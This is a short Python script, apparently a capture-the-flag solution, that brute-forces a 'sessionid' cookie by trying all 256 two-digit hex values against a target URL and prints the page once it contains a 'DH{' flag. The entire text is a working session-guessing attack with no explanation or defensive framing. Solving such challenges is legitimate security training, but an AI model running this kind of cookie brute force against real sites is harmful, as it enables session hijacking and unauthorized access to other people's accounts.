import requests

url = ADDRESS

for i in range(256):
    val = f'{i:02x}'
    cookie = {'sessionid' : val}
    res = requests.get(url = url, cookies=cookie)
    if "DH{" in res.text:
        print(res.text)
        break
